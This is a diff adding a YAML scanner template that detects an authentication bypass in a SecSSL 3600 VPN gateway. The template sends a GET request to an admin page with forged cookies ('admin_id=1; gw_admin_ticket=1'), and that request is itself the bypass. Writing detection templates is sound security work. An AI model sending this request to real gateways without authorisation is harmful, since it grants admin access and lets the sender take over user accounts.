@@ -1,0 +1,28 @@
+id: secsslvpn-auth-bypass
+name: Secure Access Gateway SecSSLVPN - Authentication Bypass
+severity: high
+confidence: confirmed
+description: The Secure Access Gateway SecSSL 3600 secure access gateway system has an unauthorized access vulnerability.
+  An attacker can obtain the user list and modify the user account password through the vulnerability.
+reference: https://mp.weixin.qq.com/s/BlXK_EB6ImceX83MIJGKsA
+tags:
+- secsslvpn
+- auth-bypass
+- vuln
+requests:
+- method: GET
+  path: /admin/group/x_group.php?id=1
+  matchers:
+  - type: body
+    words:
+    - group_action.php
+    - anonymous
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
+  headers:
+    Cookie: admin_id=1; gw_admin_ticket=1;
